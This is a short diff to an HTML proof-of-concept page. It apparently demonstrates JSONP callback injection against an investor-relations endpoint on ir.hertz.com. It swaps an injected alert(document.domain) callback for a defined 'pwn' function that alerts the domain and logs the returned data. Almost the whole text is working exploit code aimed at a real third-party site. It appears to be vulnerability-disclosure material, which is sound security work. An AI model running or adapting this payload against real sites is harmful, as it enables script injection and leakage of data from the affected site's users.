@@ -5,6 +5,12 @@
 </head>
 <body>
   <h3>PoC: alert(document.domain)</h3>
-  <script src="https://ir.hertz.com/feed/StockQuote.svc/GetStockQuoteHistoricalList?callback=alert(document.domain)&exchange=XNAS&symbol=HTZ&pageSize=-1&startDate=Sep-01-2023&endDate=Sep-01-2023"></script>
+  <script>
+    function pwn(data) {
+      alert("Domain: " + document.domain);
+      console.log("Data:", data);
+    }
+  </script>
+  <script src="https://ir.hertz.com/feed/StockQuote.svc/GetStockQuoteHistoricalList?callback=pwn&exchange=XNAS&symbol=HTZ&pageSize=-1&startDate=Sep-01-2023&endDate=Sep-01-2023"></script>
 </body>
 </html>
